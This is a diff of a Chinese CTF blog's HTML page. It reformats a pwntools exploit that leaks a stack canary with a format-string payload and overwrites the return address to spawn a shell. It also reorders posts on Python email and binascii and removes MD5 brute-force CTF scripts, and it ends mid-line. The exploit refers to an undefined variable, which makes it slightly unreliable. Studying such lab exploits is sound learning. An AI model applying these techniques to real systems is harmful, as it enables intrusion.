@@ -43,7 +43,7 @@
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="./assets/img/avatar.jpg" class="js-avatar">
+			<img src="/img/avatar.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">怪咖</a></h1>
@@ -99,7 +99,7 @@
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="./assets/img/avatar.jpg" class="js-avatar">
+				<img src="/img/avatar.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">怪咖</h1>
@@ -257,12 +257,8 @@
 <h4 id="找到main函数的ret地址"><a href="#找到main函数的ret地址" class="headerlink" title="找到main函数的ret地址:"></a><strong>找到main函数的ret地址:</strong></h4><p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/a071431c124bace0697ab210d7b66ab0.png" alt><br>这段代码需要注意下：因为eip指向ret时，esp的值就是ret的地址。<br>那么代码的执行效果如下：<br>pop ecx后，ecx = 0xbffff3a0<br>pop ebx后，ebx = 0x0<br>pop ebp后，ebp = 0x0</p>
 <p>lea esp,[ecx-0x4]后，esp = *(ecx - 0x4) = *(0xbffff3a0 - 0x4) = *(0xbffff39c) = 0xb7df1e81</p>
 <p>如下：<br><img src="/2019/09/10/Canary绕过(格式化字符串利用)/b7b8e1c128f9b8f531aef4de99ec0186.png" alt><br>那么将下面的图补充完整：<br><img src="/2019/09/10/Canary绕过(格式化字符串利用)/f06e293b9d77341a1e5af0033b7df246.png" alt><br>0xbffff380存储了之后将要pop出的ecx的值<br>那么需要在这里伪造出getshell的地址 + 4，那么之后pop ecx, esp = *(&amp;getshell + 4 - 4) = getshell</p>
-<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><p>from  pwn  import  *</p>
-<p>s  =  process(‘./cannry’)<br>libc  =  ELF(‘./cannry’)</p>
-<p>#context.terminal = [‘gnome-terminal’,’-x’,’sh’,’-c’]</p>
-<p>#gdb.attach(proc.pidof(s)[0])<br>shell_addr  =  libc.symbols[‘getshell’]<br>payload  =  ‘%31$x,%x’<br>s.sendline(payload)<br>res  =  s.recv()<br>cannry_addr  =  int(res.split(‘,’)[0],16)<br>arr_addr  =  int(res.split(‘,’)[1],16)  +  4<br>print  ‘cannry_addr is : ‘  +  hex(cannry_addr)<br>print  ‘arr_addr is : ‘  +  hex(arr_addr)</p>
-<p>payload  =  p32(shell_addr)  +  ‘a’  *  96  +  p32(cannry_addr)  +  p32(arr_shell)</p>
-<p>print  ‘[*] payload is : ‘  +  payload<br>s.sendline(payload)<br>s.interactive()</p>
+<h3 id="代码如下："><a href="#代码如下：" class="headerlink" title="代码如下："></a><strong>代码如下：</strong></h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span>  pwn  <span class="keyword">import</span>  *</span><br><span class="line"></span><br><span class="line">s  =  process(<span class="string">'./cannry'</span>)</span><br><span class="line">libc  =  ELF(<span class="string">'./cannry'</span>)</span><br><span class="line"><span class="comment">#context.terminal = ['gnome-terminal','-x','sh','-c']</span></span><br><span class="line"><span class="comment">#gdb.attach(proc.pidof(s)[0])</span></span><br><span class="line">shell_addr  =  libc.symbols[<span class="string">'getshell'</span>]</span><br><span class="line">payload  =  <span class="string">'%31$x,%x'</span></span><br><span class="line">s.sendline(payload)</span><br><span class="line">res  =  s.recv()</span><br><span class="line">cannry_addr  =  int(res.split(<span class="string">','</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line">arr_addr  =  int(res.split(<span class="string">','</span>)[<span class="number">1</span>],<span class="number">16</span>)  +  <span class="number">4</span></span><br><span class="line"><span class="keyword">print</span>  <span class="string">'cannry_addr is : '</span>  +  hex(cannry_addr)</span><br><span class="line"><span class="keyword">print</span>  <span class="string">'arr_addr is : '</span>  +  hex(arr_addr)</span><br><span class="line"></span><br><span class="line">payload  =  p32(shell_addr)  +  <span class="string">'a'</span>  *  <span class="number">96</span>  +  p32(cannry_addr)  +  p32(arr_shell)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span>  <span class="string">'[*] payload is : '</span>  +  payload</span><br><span class="line">s.sendline(payload)</span><br><span class="line">s.interactive()</span><br></pre></td></tr></table></figure>
+
 <p><img src="/2019/09/10/Canary绕过(格式化字符串利用)/75dbb4fe9594be97c4d081af6151fe72.png" alt></p>
 
       
@@ -404,19 +400,19 @@
 
 
   
-    <article id="post-Python binascii模块" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Python 邮件编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/Python binascii模块/">Python binascii模块</a>
+      <a class="article-title" href="/2019/09/10/Python 邮件编程/">Python 邮件编程</a>
     </h1>
   
 
         
-        <a href="/2019/09/10/Python binascii模块/" class="archive-article-date">
+        <a href="/2019/09/10/Python 邮件编程/" class="archive-article-date">
   	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
 </a>
         
@@ -424,10 +420,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Python-binascii模块"><a href="#Python-binascii模块" class="headerlink" title="Python binascii模块"></a>Python binascii模块</h3><p>在网络编程中，经常会出现一种情况：想发二进制，却将字符串发了出去，这时候就应该使用这样一个模块，更加方便。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  <span class="string">'hello'</span></span><br><span class="line">    <span class="keyword">print</span>  s</span><br><span class="line">    b  =  binascii.b2a_hex(s)</span><br><span class="line">    <span class="keyword">print</span>  b</span><br><span class="line">    <span class="keyword">print</span>  type(b)</span><br><span class="line">    c  =  binascii.a2b_hex(b)</span><br><span class="line">    <span class="keyword">print</span>  c</span><br><span class="line">    <span class="keyword">print</span>  type(c)</span><br><span class="line">    b  =  binascii.hexlify(s)</span><br><span class="line">    <span class="keyword">print</span>  b</span><br><span class="line">    <span class="keyword">print</span>  type(b)</span><br><span class="line">    c  =  binascii.unhexlify(b)</span><br><span class="line">    <span class="keyword">print</span>  c</span><br><span class="line">    <span class="keyword">print</span>  type(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+        <h3 id="Python-邮件编程"><a href="#Python-邮件编程" class="headerlink" title="Python 邮件编程"></a>Python 邮件编程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span>  smtplib</span><br><span class="line"><span class="keyword">from</span>  email.mime.text  <span class="keyword">import</span>  MIMEText</span><br><span class="line"><span class="keyword">from</span>  email.header  <span class="keyword">import</span>  Header</span><br><span class="line"><span class="keyword">from</span>  email.mime.multipart  <span class="keyword">import</span>  MIMEMultipart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># smtp服务器</span></span><br><span class="line"></span><br><span class="line">host  =  <span class="string">"smtp.qq.com"</span></span><br><span class="line">sender  =  <span class="string">"xxxxxxx@qq.com"</span></span><br><span class="line"></span><br><span class="line">receivers  = [<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码，非邮箱密码</span></span><br><span class="line"></span><br><span class="line">password  =  <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 带附件的邮件实例</span></span><br><span class="line"></span><br><span class="line">message  =  MIMEMultipart()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不带附件的邮件实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># message = MIMEText(msg,'html','utf-8')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg = """</span></span><br><span class="line"><span class="comment">#&lt;p&gt;电子邮件内容&lt;/p&gt;</span></span><br><span class="line"><span class="comment">#&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">#"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一种写法</span></span><br><span class="line"></span><br><span class="line">message.attach(MIMEText(<span class="string">'&lt;p&gt;电子邮件内容&lt;/p&gt;&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;'</span>,<span class="string">'html'</span>,<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># message.attach(MIMEText('&lt;p&gt;电子邮件内容&lt;/p&gt;&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;','plain','utf-8'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个附件</span></span><br><span class="line"></span><br><span class="line">attr1  =  MIMEText(open(<span class="string">'1.jpg'</span>,<span class="string">'rb'</span>).read(),<span class="string">'base64'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">attr1[<span class="string">"Content-Type"</span>] =  <span class="string">"application/octet-stream"</span></span><br><span class="line">attr1[<span class="string">"Content-Disposition"</span>] =  <span class="string">"attachment; filename='1.jpg'"</span></span><br><span class="line"></span><br><span class="line">attr2  =  MIMEText(open(<span class="string">'2.jpg'</span>,<span class="string">'rb'</span>).read(),<span class="string">'base64'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">attr2[<span class="string">"Content-Type"</span>] =  <span class="string">"application/octet-stream"</span></span><br><span class="line">attr2[<span class="string">"Content-Disposition"</span>] =  <span class="string">"attachment; filename='2.jpg'"</span></span><br><span class="line"></span><br><span class="line">message[<span class="string">'From'</span>] =  Header(<span class="string">"测试"</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">message[<span class="string">'To'</span>] =  Header(<span class="string">"测试"</span>,<span class="string">"utf-8"</span>)</span><br><span class="line">message.attach(attr1)</span><br><span class="line">message.attach(attr2)</span><br><span class="line"></span><br><span class="line">subject  =  <span class="string">'测试'</span></span><br><span class="line">message[<span class="string">'Subject'</span>] =  Header(subject,<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 465为下述图片中smtp服务器使用SSL的端口号，587不对</span></span><br><span class="line">    smtpObj  =  smtplib.SMTP_SSL(host,<span class="number">465</span>)</span><br><span class="line">    smtpObj.login(sender,password)</span><br><span class="line">    smtpObj.sendmail(sender,receivers,message.as_string())</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'发送成功'</span></span><br><span class="line"><span class="keyword">except</span>  Exception  <span class="keyword">as</span>  e:</span><br><span class="line">    <span class="keyword">print</span>  e</span><br></pre></td></tr></table></figure>
 
-<p>运行结果如下：<br>![](Python binascii模块/f940a338ac1bfab180ef9a9f86c15db9.png)<br>注意：<br>a2b:  ascii to binascii？NO！是binascii to ascii，即如果要将十六进制数转化为字符串,用a2b<br>b2a: ascii to binascii，即如果要将字符串转化为十六进制数，用b2a</p>
+<p>![1564044086968.png](Python 邮件编程/c49ccdee083d384653faa8cdec824f61.png)<br>![1564044557919.png](Python 邮件编程/d6e62c7ca1858b27e077ea617a621e54.png)</p>
+<p>测试结果如下：<br>![](Python 邮件编程/e5b834ba43103962b14a41c0b4d79bc3.png)</p>
 
       
 
@@ -451,7 +447,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/Python binascii模块/">展开全文 >></a>
+          <a class="article-more-a" href="/2019/09/10/Python 邮件编程/">展开全文 >></a>
         </p>
       
 
@@ -562,19 +558,19 @@
 
 
   
-    <article id="post-Python 邮件编程" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+    <article id="post-Python binascii模块" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/Python 邮件编程/">Python 邮件编程</a>
+      <a class="article-title" href="/2019/09/10/Python binascii模块/">Python binascii模块</a>
     </h1>
   
 
         
-        <a href="/2019/09/10/Python 邮件编程/" class="archive-article-date">
+        <a href="/2019/09/10/Python binascii模块/" class="archive-article-date">
   	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
 </a>
         
@@ -582,10 +578,10 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <h3 id="Python-邮件编程"><a href="#Python-邮件编程" class="headerlink" title="Python 邮件编程"></a>Python 邮件编程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding: utf-8</span></span><br><span class="line"><span class="keyword">import</span>  smtplib</span><br><span class="line"><span class="keyword">from</span>  email.mime.text  <span class="keyword">import</span>  MIMEText</span><br><span class="line"><span class="keyword">from</span>  email.header  <span class="keyword">import</span>  Header</span><br><span class="line"><span class="keyword">from</span>  email.mime.multipart  <span class="keyword">import</span>  MIMEMultipart</span><br><span class="line"></span><br><span class="line"><span class="comment"># 邮件</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># smtp服务器</span></span><br><span class="line"></span><br><span class="line">host  =  <span class="string">"smtp.qq.com"</span></span><br><span class="line">sender  =  <span class="string">"xxxxxxx@qq.com"</span></span><br><span class="line"></span><br><span class="line">receivers  = [<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>,<span class="string">"xxxxxxx@qq.com"</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 密码，非邮箱密码</span></span><br><span class="line"></span><br><span class="line">password  =  <span class="string">"xxxxxxxxxxxxxxxx"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 带附件的邮件实例</span></span><br><span class="line"></span><br><span class="line">message  =  MIMEMultipart()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 不带附件的邮件实例</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># message = MIMEText(msg,'html','utf-8')</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#msg = """</span></span><br><span class="line"><span class="comment">#&lt;p&gt;电子邮件内容&lt;/p&gt;</span></span><br><span class="line"><span class="comment">#&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;</span></span><br><span class="line"><span class="comment">#"""</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 另一种写法</span></span><br><span class="line"></span><br><span class="line">message.attach(MIMEText(<span class="string">'&lt;p&gt;电子邮件内容&lt;/p&gt;&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;'</span>,<span class="string">'html'</span>,<span class="string">'utf-8'</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># message.attach(MIMEText('&lt;p&gt;电子邮件内容&lt;/p&gt;&lt;p&gt;&lt;a href="[http://www.baidu.com](http://www.baidu.com/)"&gt;百度搜索&lt;/a&gt;&lt;/p&gt;','plain','utf-8'))</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 两个附件</span></span><br><span class="line"></span><br><span class="line">attr1  =  MIMEText(open(<span class="string">'1.jpg'</span>,<span class="string">'rb'</span>).read(),<span class="string">'base64'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">attr1[<span class="string">"Content-Type"</span>] =  <span class="string">"application/octet-stream"</span></span><br><span class="line">attr1[<span class="string">"Content-Disposition"</span>] =  <span class="string">"attachment; filename='1.jpg'"</span></span><br><span class="line"></span><br><span class="line">attr2  =  MIMEText(open(<span class="string">'2.jpg'</span>,<span class="string">'rb'</span>).read(),<span class="string">'base64'</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">attr2[<span class="string">"Content-Type"</span>] =  <span class="string">"application/octet-stream"</span></span><br><span class="line">attr2[<span class="string">"Content-Disposition"</span>] =  <span class="string">"attachment; filename='2.jpg'"</span></span><br><span class="line"></span><br><span class="line">message[<span class="string">'From'</span>] =  Header(<span class="string">"测试"</span>,<span class="string">'utf-8'</span>)</span><br><span class="line">message[<span class="string">'To'</span>] =  Header(<span class="string">"测试"</span>,<span class="string">"utf-8"</span>)</span><br><span class="line">message.attach(attr1)</span><br><span class="line">message.attach(attr2)</span><br><span class="line"></span><br><span class="line">subject  =  <span class="string">'测试'</span></span><br><span class="line">message[<span class="string">'Subject'</span>] =  Header(subject,<span class="string">"utf-8"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="comment"># 465为下述图片中smtp服务器使用SSL的端口号，587不对</span></span><br><span class="line">    smtpObj  =  smtplib.SMTP_SSL(host,<span class="number">465</span>)</span><br><span class="line">    smtpObj.login(sender,password)</span><br><span class="line">    smtpObj.sendmail(sender,receivers,message.as_string())</span><br><span class="line">    <span class="keyword">print</span>  <span class="string">'发送成功'</span></span><br><span class="line"><span class="keyword">except</span>  Exception  <span class="keyword">as</span>  e:</span><br><span class="line">    <span class="keyword">print</span>  e</span><br></pre></td></tr></table></figure>
+        <h3 id="Python-binascii模块"><a href="#Python-binascii模块" class="headerlink" title="Python binascii模块"></a>Python binascii模块</h3><p>在网络编程中，经常会出现一种情况：想发二进制，却将字符串发了出去，这时候就应该使用这样一个模块，更加方便。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  binascii</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    s  =  <span class="string">'hello'</span></span><br><span class="line">    <span class="keyword">print</span>  s</span><br><span class="line">    b  =  binascii.b2a_hex(s)</span><br><span class="line">    <span class="keyword">print</span>  b</span><br><span class="line">    <span class="keyword">print</span>  type(b)</span><br><span class="line">    c  =  binascii.a2b_hex(b)</span><br><span class="line">    <span class="keyword">print</span>  c</span><br><span class="line">    <span class="keyword">print</span>  type(c)</span><br><span class="line">    b  =  binascii.hexlify(s)</span><br><span class="line">    <span class="keyword">print</span>  b</span><br><span class="line">    <span class="keyword">print</span>  type(b)</span><br><span class="line">    c  =  binascii.unhexlify(b)</span><br><span class="line">    <span class="keyword">print</span>  c</span><br><span class="line">    <span class="keyword">print</span>  type(c)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>  __name__  ==  <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
 
-<p>![1564044086968.png](Python 邮件编程/c49ccdee083d384653faa8cdec824f61.png)<br>![1564044557919.png](Python 邮件编程/d6e62c7ca1858b27e077ea617a621e54.png)</p>
-<p>测试结果如下：<br>![](Python 邮件编程/e5b834ba43103962b14a41c0b4d79bc3.png)</p>
+<p>运行结果如下：<br>![](Python binascii模块/f940a338ac1bfab180ef9a9f86c15db9.png)<br>注意：<br>a2b:  ascii to binascii？NO！是binascii to ascii，即如果要将十六进制数转化为字符串,用a2b<br>b2a: ascii to binascii，即如果要将字符串转化为十六进制数，用b2a</p>
 
       
 
@@ -609,87 +605,7 @@
 
       
         <p class="article-more-link">
-          <a class="article-more-a" href="/2019/09/10/Python 邮件编程/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-PythonHash" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2019/09/10/PythonHash/">PythonHash</a>
-    </h1>
-  
-
-        
-        <a href="/2019/09/10/PythonHash/" class="archive-article-date">
-  	<time datetime="2019-09-10T10:01:31.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2019-09-10</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="PythonHash"><a href="#PythonHash" class="headerlink" title="PythonHash"></a>PythonHash</h3><p>以<strong>实验吧 密码学 ROT-13变身了</strong>为例：</p>
-<p>先rot13(ord(‘F’) - 83 = 13)下，拿到 flag{www_shiyanbar_com_is_very_good_xxxx}</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span>  hashlib,sys</span><br><span class="line"><span class="comment">#38e4c352809e150186920aac37190cbc</span></span><br><span class="line"></span><br><span class="line">arr  =  <span class="string">'flag&#123;www_shiyanbar_com_is_very_good_'</span></span><br><span class="line">count  =  <span class="number">0</span></span><br><span class="line"><span class="keyword">print</span>  <span class="string">'Run.'</span>,</span><br><span class="line"></span><br><span class="line">dict  =  <span class="string">'!"#$%&amp;\'()*+,-./0123456789:;&lt;=&gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz&#123;|&#125;~]'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>  a  <span class="keyword">in</span>  dict:</span><br><span class="line">    <span class="keyword">for</span>  b  <span class="keyword">in</span>  dict:</span><br><span class="line">        <span class="keyword">for</span>  c  <span class="keyword">in</span>  dict:</span><br><span class="line">            <span class="keyword">for</span>  d  <span class="keyword">in</span>  dict:</span><br><span class="line">                count  +=  <span class="number">1</span></span><br><span class="line">                <span class="keyword">if</span>  count  %  <span class="number">1000000</span>  ==  <span class="number">0</span>:</span><br><span class="line">                    <span class="keyword">print</span>  <span class="string">'.'</span>,</span><br><span class="line"></span><br><span class="line">                md5  =  hashlib.md5((arr+a+b+c+d+<span class="string">'&#125;'</span>).encode(<span class="string">'utf-8'</span>)).hexdigest()<span class="comment">#hashlib.md5(str.encode('utf-8')).hexdigest()</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span>  md5  ==  <span class="string">'38e4c352809e150186920aac37190cbc'</span>:</span><br><span class="line">                    <span class="keyword">print</span>  <span class="string">'\n[*] '</span>,</span><br><span class="line">                    <span class="keyword">print</span>  md5,</span><br><span class="line">                    <span class="keyword">print</span>  arr+a+b+c+d+<span class="string">'&#125;'</span></span><br><span class="line">                    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://www.iloveflag.com:8002/index.php'</span></span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line">response = s.get(url)</span><br><span class="line">head = response.headers</span><br><span class="line"><span class="keyword">print</span> head</span><br><span class="line">password = head[<span class="string">'password'</span>].split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> password</span><br><span class="line">password1 = password</span><br><span class="line">cont = <span class="number">1540110000</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):</span><br><span class="line">    md = hashlib.md5()</span><br><span class="line">    md.update(str(cont).encode())</span><br><span class="line">    <span class="comment">#print str(cont),md.hexdigest()</span></span><br><span class="line">    <span class="keyword">if</span> (md.hexdigest() 